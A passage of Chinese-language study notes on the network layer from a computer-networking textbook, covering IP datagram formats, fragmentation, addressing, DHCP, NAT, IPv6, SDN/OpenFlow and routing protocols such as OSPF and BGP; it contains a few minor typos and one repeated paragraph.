到达输出链路的分组被分类放入输出队列中的优先权类。在非抢占式优先权排队规则下，一旦分组开始传输，就不能打断。</p><p><strong><code>循环排队：</code></strong> 分组像使用优先权排队那样被分类。然而，在类之间不存在严格的服务优先权，循环调度器在这些类之间轮流提供服务。保持工作排队规则在有分组排队等待传输时，不允许链路保持空闲。加权公平排队（Weighted Fair Queuing, WFQ）规则下，每个类在任何时间间隔内可能受到不同数量的服务。具体而言，每个类i被分配一个权wi。使用WFQ方式，在类i有分组要发送的任何时间间隔中，第i类将确保接受到的服务部分等于wi/(∑wj)，分母中的和是计算所有分组排队等待传输的类别得到的。对于一条传输速率为R的链路，第i类总能获得至少为R ∙ wi/(∑wj)的吞吐量。</p><h2 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h2><p><strong><code>网络层三个组件 ：</code></strong></p><ul><li><strong><code>IP协议</code></strong></li><li><strong><code>路由选择协议</code></strong></li><li><strong><code>控制报文协议（ICMP）</code></strong> ：报告数据报中的差错、对某些网络层信息请求进行响应的设施</li></ul><h3 id="IPv4数据报格式"><a href="#IPv4数据报格式" class="headerlink" title="IPv4数据报格式"></a>IPv4数据报格式</h3><p>网络层分组被称为<code>数据报</code></p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920170530669.png"></p><p><strong><code>版本号（IPv4、IPv6）：</code></strong> 不同版本对数据报不同解释，4比特规定了数据报的IP协议版本</p><p><strong><code>首部长度：</code></strong> 数据报可包含可变数量的选项。不过大部分没有，首部固定20字节</p><p><strong><code>服务类型：</code></strong> 区分不同类型的IP数据报</p><p><strong><code>数据报长度：</code></strong> 首部+数据的长度。该字段16bit，然而一般数据报很少超过1500字节</p><p><strong><code>标识、标志、片偏移:</code></strong> IP分片相关。不过IPv6不允许在路由器上对分组分片</p><p><strong><code>寿命TTL：</code></strong> 确保数据报不会永远在网络中循环。每被一个路由器处理时，值-1。若值减到0，丢弃数据报</p><p><strong><code>协议号：</code></strong> 到达最终目的地才有用，指示了IP数据报的数据部分应该交给哪个运输层协议。如6交给TCP，如17交给UDP</p><p>协议号是将网络层与运输层绑定到一起的粘合剂；端口号是将运输层和应用层绑定的粘合剂</p><p><strong><code>首部检验和：</code></strong> 帮忙路由器检测收到IP数据报中首部的比特错误，有错一般丢弃</p><p><strong><code>源和目的IP地址：</code></strong> 源主机通过DNS查找目的地址</p><p>选项：IPv6已抛弃选项字段</p><p><strong><code>数据（有效载荷）：</code></strong> 包含运输层报文段（TCP或UDP），或ICMP报文段</p><ul><li>一个IP数据报有长为20的首部，如果数据报承载一个TCP报文段，则每个无分片数据报承载总长40的首部（还有TCP的20）以及应用层报文</li></ul><h3 id="IPv4数据报分片"><a href="#IPv4数据报分片" class="headerlink" title="IPv4数据报分片"></a>IPv4数据报分片</h3><ul><li>并不是所有链路层协议都能承载相同长度的网络层分组，如以太网帧能承载不超过1500字节的数据，某些广域网链路帧不超过576字节</li><li>一个链路层帧承载的最大数据量：最大传送单元MTU</li><li>限制了IP数据报的长度，且发送方与目的路径上的每段链路可能使用不同的链路层协议，有不同的MTU</li><li>将IP数据报中的数据分片成多个较小的IP数据报，用单独的链路层帧封装这些小IP数据报，每个小数据报叫片</li><li>数据报的重新组装放在端系统中，而不是路由器中</li><li>标识、标志、片偏移字段，帮助主机执行重组任务</li><li>一个4000字节的数据报（20+3980）到达一台路由器，转发到一条MTU为1500子节的链路上。必须分配3个独立的片，假设初始数据报的标识号是777，则前两片字节都为20+1480，第三层为20+1020</li></ul><p><strong>安全性</strong></p><ul><li>分片被用于Dos攻击，如Jolt2，攻击者向目标主机发送小片的流，没有一个片的偏移量是0，目标试图重组时可能会崩溃</li><li>发送交迭偏移量的IP片，不能被适当排列，可能会崩溃</li><li>IPv6废除了分片，简化了IP分组的处理</li></ul><h3 id="IPv4编址"><a href="#IPv4编址" class="headerlink" title="IPv4编址"></a>IPv4编址</h3><p><strong>主机与路由器连入网络的方法</strong></p><p>①一台主机通常只有一条链路连接到网络，主机IP发送数据报从该链路发送</p><p>②主机与物理链路的边界叫接口，一台路由器有多个接口</p><p>③IP要求每台主机和路由器都有自己的IP地址，因此一个IP地址实际上是与每一个接口相关联的</p><p>每个IP地址长度32bit（4字节），总共2^32个可能的IP地址，约40亿个,用**<code>点分十进制记法</code>** ，如193.32.216.9</p><p><strong><code>一个接口的IP地址的一部分需要由其连接的子网决定</code></strong></p><ul><li>如互联3个主机接口与1个路由器接口的网络形成一个子网，IP编址为这个子网分配一个地址：223.1.1.0/24，/24记法称为子网掩码，指示了32bit中的最左侧24bit定义了子网地址</li><li>为了确定子网，分开主机和路由器的每个接口，产生几个隔离的网络岛，使用接口端接这些隔离的网络的端点，这些隔离的网络中每一个都叫做一个子网</li></ul><p><strong><code>因特网地址分配策略：</code></strong> 无类别域间路由选择CDIR</p><p>a.b.c.d/x的地址的x最高比特构成IP地址的网络部分，称为该地址的前缀，一个组织通常被分配一块连续的地址，即具有相同前缀的一段地址。BGP路由选择协议中，该组织网络外的路由器仅考虑x，减少了转发表的长度，因为形式为a.b.c.d/x单一表项足以将数据报转发到该组织内的任何目的地</p><p><strong><code>地址聚合（路由聚合）：</code></strong> 使用单个网络前缀通告多个网络的能力<br>一个ISP将8个组织连接到因特网。该ISP向外界通告：向我发送以200.23.16.0/20开始的任何内容。外部无需知道在该地址块内还有8个其他组织，每个组织有自己的子网</p><p>一个地址的剩余32-x比特可认为是用于区分该组织内部设备的。组织内部路由器转发分组时，才会考虑这些比特</p><p>在CDIR出现之前，采用分类编址，A、B、C类网络，分别具有8、16、24比特子网地址</p><p><strong><code>C类（/24）</code></strong> 仅能容纳2^8-2=254台主机（其中两个用于特殊用途）。 C类地址第1字节、第2字节和第3个字节为网络地址，第4个字节为主机地址。另外第1个字节的前三位固定为110。192.168.X.X是私有地址。</p><p>(192.168.0.0-192.168.255.255)</p><p>⑵ C类地址范围：192.0.0.0—223.255.255.255。</p><p><strong><code>B类（/16）</code></strong> 支持65534台主机，一个组织分配一个B类地址却只用2000个接口，造成巨大浪费。B类地址范围：128.0.0.0—191.255.255.255</p><p><strong><code>A类：</code></strong> A类地址第1字节为网络地址，其它3个字节为主机地址。，A类地址范围：1.0.0.0—127.255.255.255。A类地址中的私有地址和保留地址：</p><p>① 10.X.X.X是私有地址（所谓的私有地址就是在互联网上不使用，而被用在局域网络中的地址）。范围（10.0.0.0.0-10.255.255.255）</p><p>② 127.X.X.X是保留地址，用做循环测试用的</p><p><strong><code>IP广播地址</code></strong></p><p>当一台主机发出目的地址为255.255.255.255的数据报时，报文会交付给同一个网络的所有主机，可用于DHCP发现报文的发送，广播最小生成树</p><h4 id="获取一块地址"><a href="#获取一块地址" class="headerlink" title="获取一块地址"></a>获取一块地址</h4><ul><li>子网获取IP地址：由ISP从它大块地址中分配</li><li>ISP获取IP地址：IP地址由因特网名字和编号分配机构ICANN管理（也管理DNS根服务器、AS标识号）。ICANN向区域性因特网注册机构分配地址，处理本地域内的地址分配/管理</li></ul><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920170557648.png"></p><h4 id="获取主机地址"><a href="#获取主机地址" class="headerlink" title="获取主机地址"></a>获取主机地址</h4><ul><li>组织获得一块地址，就可为组织内的主机、路由器接口逐个分配IP地址</li><li>主机地址能手动配置，也能自动配置，即动态主机配置协议DHCP</li></ul><h4 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a>动态主机配置协议DHCP</h4><ul><li>DHCP允许主机自动获取一个IP地址</li><li>DHCP可配置，可以使主机每次连网获得相同IP地址，也可每次分配一个临时IP地址（比如ISP给你家分配了一个IP地址，你想多台主机同时连网时，需要配置路由器。一般电信这种会给你家分配临时IP地址，这样节省IP地址。也有的每次连接都是固定地址比如公寓的ISP，这时需要手动在路由器设置里输入，可以ipconfig查看）</li><li>DHCP还允许主机查看子网掩码、默认网关（第一跳路由器地址）、本地DNS服务器地址</li><li>DHCP能将主机连接进一个网络的自动能力，常被称为即插即用协议</li><li>DHCP是一个客户-服务器协议。新来的主机要获得自使用的IP地址等网络配置信息</li></ul><p>1.每个子网都有一台DHCP服务器</p><p>2.若子网没有DHCP服务器，则由一个路由器做DHCP中继代理，该代理知道该网络的DHCP服务器地址</p><h5 id="DHCP协议的四个步骤"><a href="#DHCP协议的四个步骤" class="headerlink" title="DHCP协议的四个步骤"></a>DHCP协议的四个步骤</h5><p><strong><code>DHCP服务器发现</code></strong></p><p>新到的客户通过广播DHCP发现报文，发现一个要与其交互的DHCP服务器<br>客户在UDP分组中向端口67发送该发现报文，此时必须用广播地址255.255.255.255，源地址是0.0.0.0</p><p><strong><code>DHCP服务器提供</code></strong></p><p>DHCP收到DHCP发现报文后，响应一个DHCP提供报文，仍然使用广播地址，因为此时新客户并没有IP地址</p><p>可能有多台DHCP服务器，每台服务器提供的报文中，有向客户主机推荐的IP地址、网络掩码以及IP地址租用期（一般几天或几小时）</p><p><strong><code>DHCP请求</code></strong></p><p>客户从提供中选一个，向选中的服务器提供一个DHCP请求报文进行响应，回显配置参数</p><p><strong><code>DHCP ACK</code></strong></p><p>收到DHCP请求报文后，用DHCP ACK报文对其记性响应，证实所传参数<br>客户收到ACK后，交互完成，在租期内使用DHCP分配的IP地址。DHCP提供了机制允许客户更新对一个IP地址的租用</p><h3 id="网络地址转换"><a href="#网络地址转换" class="headerlink" title="网络地址转换"></a>网络地址转换</h3><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920170621318.png"></p><p>当ISP已经为SOHO网络当前地址范围分配过一块连续地址，而SOHO内主机越来也多时，需要用到NAT（比如电信给你家分配一个动态IP地址，家里要好几台手机电脑联网用一个IP地址，需要用NAT）</p><p>当ISP已经为SOHO网络当前地址范围分配过一块连续地址，而SOHO内主机越来也多时，需要用到NAT（比如电信给你家分配一个动态IP地址，家里要好几台手机电脑联网用一个IP地址，需要用NAT）</p><h4 id="UPnP"><a href="#UPnP" class="headerlink" title="UPnP"></a>UPnP</h4><ul><li>NAT穿越由通用即插即用（UPnP）提供</li><li>UPnP是一种允许主机发现并配置邻接NAT的协议，要求主机和NAT都是UPnP兼容</li><li>使用UPnP，在主机上运行的应用程序能为某些请求的公共端口号请求一个NAT映射（专用IP地址，专用端口号 — 公共IP地址，公共端口号）。如果某NAT接收请求并生成映射，来自外部的结点能发起到（公共IP地址，公共端口号）的TCP连接</li></ul><h3 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h3><p>IPv4地址耗尽，IPv6也可强化IPv4某些方面</p><h4 id="IPv6数据报格式"><a href="#IPv6数据报格式" class="headerlink" title="IPv6数据报格式"></a>IPv6数据报格式</h4><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920170645532.png"></p><p>①扩大的地址容量</p><p>32bit —&gt; 128bit</p><p>r除了单播多播地址，引入任播地址，使数据报交付给一组主机中的任意一个</p><p>②简化高效的40字节首部</p><p>③流标签与优先级</p><p>如音频流、视频流、高优先级用户承载的流量</p><p><strong><code>IPv6定义的字段：</code></strong></p><p>①版本</p><p>②流量类型</p><p>③流标签</p><p>④有效载荷长度</p><p>⑤下一个首部</p><p>⑥跳限制</p><p>⑦源地址和目的地址</p><p>⑧数据</p><p><strong><code>IPv6中不存在的IPv4数据报字段</code></strong></p><p>①分片/重新组装：只能在源与目的地进行</p><p>②首部检验和</p><p>③选项：放到了下一个首部位置，使得IP首部定长40字节</p><h4 id="IPv4到IPv6的迁移"><a href="#IPv4到IPv6的迁移" class="headerlink" title="IPv4到IPv6的迁移"></a>IPv4到IPv6的迁移</h4><p>4到v6的迁移，两种双栈（dual-stack）方法。</p><p>1.接受结点和发送节点如果都是IPv6，则使用v6，否则使用IPv4。</p><p>2.将IPv4路由器集合作为隧道（tunneling），将IPv6数据报放入IPv4的数<br>据字段</p><h2 id="通用转发和SDN"><a href="#通用转发和SDN" class="headerlink" title="通用转发和SDN"></a>通用转发和SDN</h2><p>将基于目的地转发的特征总结为两个步骤：查找目的IP地址（“匹配”），然后将分组发送到有特定输出端口的交换结构（“动作”）。现有一种更有意义的通用“匹配加动作”范式，其中能够对协议栈的多个首部字段进行“匹配”，这些首部字段是与不同层次的不同协议相关联的。</p><h3 id="匹配"><a href="#匹配" class="headerlink" title="匹配"></a>匹配</h3><p>匹配加动作转发表在OpenFlow中成为流表，它的每个表项包括：</p><p>1.首部字段值的集合。入分组将与之匹配。匹配不上流表项的分组将被丢弃或发送到远程控制器做更多处理。</p><p>2.计数器集合。这些计数器可以包括已经与该表项匹配的分组数量，以及自从该表项匹配的分组数量，以及自从该表项上次更新以来的时间。</p><p>当分组匹配流表项时所采取的动作集合。这些动作可能将分组转发到给定的3.输出端口，丢弃该分组、复制该分组和将它们发送到多个输出端口，和/或重写所选的首部字段。</p><h3 id="动作"><a href="#动作" class="headerlink" title="动作"></a>动作</h3><p>1.转发</p><p>2.丢弃。没有动作的流表项表明某个匹配的分组应当丢弃</p><p>3.修改字段</p><h2 id="五、网络层控制平面"><a href="#五、网络层控制平面" class="headerlink" title="五、网络层控制平面"></a>五、网络层控制平面</h2><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>计算、维护和安装转发表和流表有两种可能的方法：</p><p>1.每路由器控制。每台路由器中都包含转发和路由选择功能。每台路由器有一个路由选择组件，用于与其他路由器中的路由选择组件通信，以计算转发表的值。</p><p>2.逻辑集中式控制。逻辑集中式控制器计算并分发转发表以供每台路由器使用。</p><h2 id="路由选择算法"><a href="#路由选择算法" class="headerlink" title="路由选择算法"></a>路由选择算法</h2><h3 id="根据路由算则算法是集中式还是分散式"><a href="#根据路由算则算法是集中式还是分散式" class="headerlink" title="根据路由算则算法是集中式还是分散式"></a>根据路由算则算法是集中式还是分散式</h3><h4 id="集中式路由选择算法"><a href="#集中式路由选择算法" class="headerlink" title="集中式路由选择算法"></a>集中式路由选择算法</h4><p>完整的、全局性的网络知识计算出从源到目的地之间的最低开销路径。也就是说，该算法以所有节点之间的连通性及所有链路的开销为输入。这就要求该算法在真正开始计算以前，要以某种方式获得这种信息。具有全局状态信息的算法常被称作 <code>链路状态（Link State, LS）算法</code>。</p><h4 id="分散式路由选择算法"><a href="#分散式路由选择算法" class="headerlink" title="分散式路由选择算法"></a>分散式路由选择算法</h4><p>路由器以迭代、分布式的方式计算出最低开销路径。没有节点拥有关于所有网络链路的开销的完整信息。相反，每个节点仅有与其之间相连链路的开销知识即可开始工作。然后，通过迭代计算过程以及与相邻节点的信息交换，一个节点逐渐计算出到达某目的节点或一组目的节点的最低开销路径。</p><h3 id="根据算法是静态的还是动态"><a href="#根据算法是静态的还是动态" class="headerlink" title="根据算法是静态的还是动态"></a>根据算法是静态的还是动态</h3><h4 id="静态路由选择算法"><a href="#静态路由选择算法" class="headerlink" title="静态路由选择算法"></a>静态路由选择算法</h4><p>路由随时间的变化非常缓慢，通常是人工进行调整。</p><h4 id="动态路由选择算法"><a href="#动态路由选择算法" class="headerlink" title="动态路由选择算法"></a>动态路由选择算法</h4><p>随着网络流量负载或拓扑发生变化而改变路由选择路径。一个动态算法可周期性地运行或直接相应拓扑或链路开销的变化而运行。虽然动态算法易于对网络的变化做出反应，但也更容易受诸如路由选择循环、路由振荡之类问题的影响。</p><h3 id="根据是负载敏感还是负载迟钝"><a href="#根据是负载敏感还是负载迟钝" class="headerlink" title="根据是负载敏感还是负载迟钝"></a>根据是负载敏感还是负载迟钝</h3><h4 id="负载敏感算法"><a href="#负载敏感算法" class="headerlink" title="负载敏感算法"></a>负载敏感算法</h4><p>链路开销会动态地变化以反应出底层链路得到当前拥塞水平。如果当前拥塞的一条链路与高开销想联系，则路由选择算法趋向于绕开该拥塞链路来选择路由。</p><h4 id="负载迟钝算法"><a href="#负载迟钝算法" class="headerlink" title="负载迟钝算法"></a>负载迟钝算法</h4><p>某条链路的开销不明确地反应其当前的拥塞水平。</p><h3 id="链路状态路由选择算法（Dijkstra）"><a href="#链路状态路由选择算法（Dijkstra）" class="headerlink" title="链路状态路由选择算法（Dijkstra）"></a>链路状态路由选择算法（Dijkstra）</h3><p>在链路状态算法中，网络拓扑和所有的链路开销都是已知的，也就是说可用作LS算法的输入。实际上这是通过让每个节点向网络中所有其他节点广播链路状态分组来完成的，其中每个链路状态分组包含它所连接的链路的标识和开销。这经常有链路状态广播算法来完成。链路状态算法实际上是用Dijkstra算法实现的。</p><h3 id="距离向量路由选择算法"><a href="#距离向量路由选择算法" class="headerlink" title="距离向量路由选择算法"></a>距离向量路由选择算法</h3><p><code>距离向量（Distance-Vector, DV）算法</code> 是一种迭代的、异步的和分布式的算法。DV算法实际上是用Bellman-Ford算法实现的。在DV算法中，当节点x发现它的直接相连的链路开销变化或从某个邻居接收到一个距离向量的更新时，它就更新距离向量估计值。每个节点等待来自任何邻居的更新，当接收到一个更新时计算它的新距离向量并向它的邻居分布其新距离向量。</p><p><code>DV算法</code> 会遇到 <code>路由选择环路</code> 而变得缓慢。对于两个直接相连的节点，可以通过毒性逆转技术加以避免，但是对于3个或以上的节点就无法使用毒性逆转技术检测到。</p><h4 id="LS算法与DV算法的比较"><a href="#LS算法与DV算法的比较" class="headerlink" title="LS算法与DV算法的比较"></a>LS算法与DV算法的比较</h4><p><code>报文复杂性。</code> LS算法要求每个节点都知道网络中每条链路的开销。这就要求发送O(|N||E|)个报文。而且无论何时一条链路的开销改变时，必须向所有节点发送新的链路开销。DV算法要求在每次迭代时，在两个直接相连邻居之间交换报文。算法收敛所需时间依赖于许多因素。当链路开销改变时，DV算法仅当在新的链路开销导致与该链路相连节点的最低开销路径发生改变时，才传播已改变的链路开销。</p><p><code>收敛速度。</code>LS算法的实现是一个要求O(|N||E|)个报文的O(|N|2)算法。DV算法收敛较慢，且在收敛时会遇到路由选择环路。DV算法还会遇到无穷计数问题。</p><p><code>健壮性。</code> 如果一台路由器发生故障、行为错乱或收到蓄意破坏时，对于LS算法，路由器能够向其连接广播不正确的开销。作为LS广播的一部分，一个节点也可损坏或丢弃它收到的任何LS广播分组。但是一个LS节点仅计算自己的转发表；其他节点也自行执行类似的计算。这就意味着在LS算法下，路由计算在某种程度上是分离的，提供了一定程度的健壮性。在DV算法中，一个节点可向任意或所有目的节点通告其不正确的最低开销路径。在此情况下，DV算法中一个不正确的节点计算值会扩散到整个网络。</p><h2 id="因特网中自治系统内部的路由"><a href="#因特网中自治系统内部的路由" class="headerlink" title="因特网中自治系统内部的路由"></a>因特网中自治系统内部的路由</h2><h3 id="选择OSPF"><a href="#选择OSPF" class="headerlink" title="选择OSPF"></a>选择OSPF</h3><ul><li>随着路由器数目变得很大，涉及路由选择信息的通信、计算和存储的开销将高得不可实现。因特网是ISP的网络，其中每个ISP都有它自己的路由器网络。ISP通常希望按自己的意愿运行路由器，或对外部隐藏其网络的内部组织面貌。这两个问题都可以通过将路由器组织进 <code>自治系统（Autonomous System, AS）</code> 来解决。其中每个AS由一组通常处在相同管理控制下的路由器组成。通常在一个ISP中的路由器以及互联它们的链路构成一个AS，而其他ISP则将它们的ISP拆分为数十个互联的AS。一个自治系统由其全局唯一的AS号（ASN）所标识。</li><li>在相同的AS中的路由器都运行相同的路由选择算法并且有彼此的信息。在一个自治系统内运行得到路由选择算法叫做 <code>自治系统内部路由选择协议</code> 。</li></ul><h4 id="开放最短路优先（OSPF）"><a href="#开放最短路优先（OSPF）" class="headerlink" title="开放最短路优先（OSPF）"></a>开放最短路优先（OSPF）</h4><p><code>开放最短路优先（OSPF）</code> 是一种链路状态协议，它使用洪泛链路状态信息和Dijkstra最低开销路径算法。使用OSPF，一台路由器构建了一副关于整个自治系统的完整拓扑图。于是，每台路由器在本地运行Dijkstra的最短路径算法，以确定一个自身为根节点到所有子网的最短路径树。各条链路开销是由网络管理员配置的。</p><p>使用OSPF时，路由器向自治系统内所有其他路由器广播路由选择信息，而不仅仅是向其相邻路由器广播。每当一条链路的状态发生变化时，路由器就会广播链路状态信息。即使链路状态未发生变化，它也要周期性地（至少每隔30min一次）广播链路状态。</p><pre class="line-numbers language-none"><code class="language-none">OSPF的优点：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>①安全。</code> 能够鉴别OSPF路由器之间的交换。使用鉴别，仅有受信任的路由器能参与一个AS内的OSPF协议，因此可防止恶意入侵者将不正确的信息诸如路由器表内。</p><p><code>②多条相同开销路径。</code> 当到达某目的地的多条路路径具有相同的开销时，OSPF允许使用多条路径（这就是说，当存在多条相等开销的路径时，无须仅选择单一的路径来承载所有的流量）。</p><p><code>③对单播和多播路由选择的综合支持。</code> 多播OSPF（MOSPF）提供对OSPF的简单扩展，以便提供多播路由选择。MOSPF使用现有的OSPF链路数据库，并为现有的OSPF链路状态广播机制增加了一种新型的链路状态通告</p><p><code>④支持在单个AS中的层次结构。</code> 一个OSPF自治系统能够层次化地配置多个区域。每个区域都运行自己的OSPF链路状态路由选择算法，区域内的每台路由器都向该区域内的所有其他路由器广播其链路状态。</p><h2 id="ISP之间的路由选择（BGP）"><a href="#ISP之间的路由选择（BGP）" class="headerlink" title="ISP之间的路由选择（BGP）"></a>ISP之间的路由选择（BGP）</h2><p>在因特网中，所有的AS运行相同的AS间路由选择协议，称为 <code>边界网关协议（Broder Gateway Protocal, BGP）</code></p><h3 id="BGP的作用"><a href="#BGP的作用" class="headerlink" title="BGP的作用"></a>BGP的作用</h3><p><code>从邻居AS获得前缀的可达性信息。</code> BGP允许每个子网向因特网的其余部分通告他的存在。BGP确保在因特网中的的所有AS知道该子网。如果没有BGP的话，每个子网将是隔离的孤岛，即它们孤独地存在，不为其他因特网其余部分所知和所达。</p><p><code>确定到该前缀的“最好的”路由。</code> 一台路由器可能知道两条或更多条到特定前缀的不同路由。为了确定最好的路由，该路由器将本地运行一个BGP路由选择过程。该最好的路由将基于策略以及可达性信息来确定。</p><h3 id="通告BGP路由信息"><a href="#通告BGP路由信息" class="headerlink" title="通告BGP路由信息"></a>通告BGP路由信息</h3><p>对于每个AS，每台路由器要么是一台 <code>网关路由器</code> ，要么是一台内部路由器。网关路由器是一台位于 <code>AS边缘的路由器</code> ，它直接连接到在其他AS中的一台或多台路由器。内部路由器仅连接在它自己AS中主机和路由器。</p><ul><li>在BGP中，每对路由器通过使用179端口的半永久TCP连接交换路由选择信息。每条直接连接以及所有通过该连接发送的BGP报文，称为 <code>BGP连接</code> 。此外，跨越两个AS的BGP连接称为 <code>外部BGP（eBGP）连接</code> ，而在相同AS中的两台路由器之间的BGP会话称为 <code>内部BGP（iBGP）连接</code> 。通过使用eBGP和iBGP会话，路由器之间可以互相通告可达性信息。</li><li>对于每个AS，每台路由器要么是一台 <code>网关路由器</code> ，要么是一台内部路由器。网关路由器是一台位于AS边缘的路由器，它直接连接到在其他AS中的一台或 <code>多台路由器</code> 。内部路由器仅连接在它自己AS中主机和路由器。</li></ul><h3 id="确认最好的路由"><a href="#确认最好的路由" class="headerlink" title="确认最好的路由"></a>确认最好的路由</h3><p>当路由器通过 BGP连接通告前缀时，它在前缀中包括一些 <code>BDP属性</code> 。用BGP术语来说，前缀及其属性称为 <code>路由</code> 。两个较为重要的属性是 <code>AS-PATH</code> 和 <code>NEXT-HOP</code> 。AS-PATH属性包含了通告已经通过的AS列表。当一个前缀通过某AS时，该AS将其ASN加入AS-PATH中现有的列表。BGP路由器还使用AS-PATH属性来检测和防止通告环路，如果一台路由器在路径列表中看到包含了它自己的AS，它将拒绝该通告。NEXT-HOP是AS-PATH起始的路由器接口的IP地址。</p><h4 id="热土豆路由选择"><a href="#热土豆路由选择" class="headerlink" title="热土豆路由选择"></a>热土豆路由选择</h4><pre class="line-numbers language-none"><code class="language-none">在一台路由器转发表中对于热土豆路由器选择增加AS向外前缀的步骤：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1.从AS间协议学到经过多个网关可达子网x。</p><p>2.使用来自AS内部协议的路由选择信息，以决定到达每个网关的最低开销路径的开销。</p><p>3.热土豆路由选择：选择具有最小最低开销的网关。</p><p>4.从转发表确定通往最低开销的网关的接口I。在转发表中加入表项（x, I）。</p><pre class="line-numbers language-none"><code class="language-none">路由选择特点：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1.路由被指派一个本地偏好值作为其属性之一。一条路由的本地偏好可能由该路由器设置或可能在相同AS中的另一台路由器学习到。本地偏好属性的值是一种策略决定，它完全取决于该AS的网络管理员。具有最高本地偏好值的路由将被选择。</p><p>2.从余下的路由中（所有都具有相同的的最高本地偏好值），将选择具有最短AS-PATH的路由。</p><p>3.从余下的路由中（所有都具有相同的最高本地偏好值和相同的AS-PATH长度），使用热土豆路由选择，即选择具有最靠近NEXT-HOP路由器的路由。</p><p>4.如果仍留下多条路由，该路由器使用BGP标识符来选择路由。</p><h3 id="IP任意传播"><a href="#IP任意传播" class="headerlink" title="IP任意传播"></a>IP任意传播</h3><p>除了作为因特网的AS间路由选择协议外，BGP还常为用于实现IP任播服务，该服务通常同用于DNS中</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920170930087.png"></p><h2 id="SDN控制平面"><a href="#SDN控制平面" class="headerlink" title="SDN控制平面"></a>SDN控制平面</h2><h3 id="SDN体系结构有四个关键特征"><a href="#SDN体系结构有四个关键特征" class="headerlink" title="SDN体系结构有四个关键特征"></a>SDN体系结构有四个关键特征</h3><p><code>1.基于流的转发。</code>SDN的交换机分组转发工作，能够基于运输层、网络层或链路层首部中任意数量的首部字段值进行。</p><p><code>2.数据平面与控制平面分离。</code> 数据平面由网络交换机组成，交换机是相对简单（但快速）的设备，该设备在它们的流表中执行“匹配加动作”的规则。控制平面由服务器以及决定和管理交换机流表的软件组成。</p><p><code>3.网络控制功能。</code> 位于数据平面的交换机外部。软件在服务器上执行，该服务器与网络交换机截然分开且与之远离。控制平面自身由两个组件组成：一个SDN控制器，以及若干网络控制应用程序。控制器维护准确的网络状态信息；为运行在控制平面的中的网络控制应用程序提供这些信息；提供方法，这些应用程序通过这些方法能够监视、编程和控制下面的网络设备。</p><p><code>4.可编程的网络。</code> 通过运行在控制平面中的网络控制应用程序，该网络是可编程的。这些应用程序代表了SDN控制平面的“智力”，使用了由SDN控制器提供的API来定义和控制网络设备中的数据平面。</p><h3 id="SDN控制器的功能大体可组织为3个"><a href="#SDN控制器的功能大体可组织为3个" class="headerlink" title="SDN控制器的功能大体可组织为3个"></a>SDN控制器的功能大体可组织为3个</h3><p><code>通信层。</code> SDN控制器和受控网络设备之间的通信。显然，如果SDN控制器要控制远程SDN使能的交换机、主机或其他设备的运行，需要一个协议来传送控制器与这些设备之间的信息。此外，设备必须能够向可知其传递本地观察到的时间。这些时间向SDN控制器提供该网络状态的最新视图。这个协议构成了控制器体系结构的最底层。</p><p><code>网络范围状态管理层。</code> 由SDN控制平面所做出的最终控制决定，将要求控制器具有有关网络的主机、链路、交换机和其他SDN控制设备的最新状态信息。交换机的流表包含计数器，其值也可以由网络控制应用程序很好地使用；因此这些值应当为应用程序所用。</p><p><code>对于网络控制应用程序层的接口。</code> 控制器通过接口与网络控制应用程序交互。该API允许网络控制应用程序在状态管理层之间读/写网络状态和流表。当状态改变事件出现时，应用程序能够注册进行通告。</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920171000739.png">OpenFlow协议</p><p>OpenFlow协议运行在TCP之上，使用6653的默认端口号。从控制器到受控交换机流动的重要报文有下列这些：</p><ul><li><code>配置。</code> 该报文允许控制器查询并设置交换机的配置参数。</li><li><code>修改状态。</code> 该报文由控制器所使用，以增加/删除或修改交换机流表中的表项，并且设置交换机端口特性。</li><li><code>读状态。</code> 该报文被控制器用于从交换机的流表和端口收集统计数据和计数器值。</li><li><code>发送分组。</code> 该报文被控制器用于在受控交换机从特定的端口发送出一个特定的报文。</li></ul><p>从受控交换机到控制器流动的重要报文有下列这些：</p><ul><li><code>流删除。</code> 该报文通知控制器已删除一个流表项，例如由于超时，或作为收到“修改状态”报文的结果。</li><li><code>端口状态。</code> 交换机用该报文向控制器通知端口状态的变化。</li><li><code>分组入。</code> 